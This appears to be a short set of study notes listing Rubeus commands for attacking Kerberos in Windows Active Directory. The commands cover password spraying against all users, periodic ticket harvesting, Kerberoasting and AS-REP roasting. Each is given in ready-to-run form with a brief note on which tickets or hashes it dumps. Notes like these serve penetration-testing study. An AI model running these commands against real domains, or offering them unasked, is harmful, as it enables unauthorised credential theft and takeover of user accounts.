Rubeus.exe brute /password:Password1 /noticket
    - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 

Rubeus.exe harvest /interval:30 
    - This command tells Rubeus to harvest for TGTs every 30 seconds

Rubeus.exe kerberoast 
    - This will dump the Kerberos hash of any kerberoastable users

Rubeus.exe asreproast
    - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.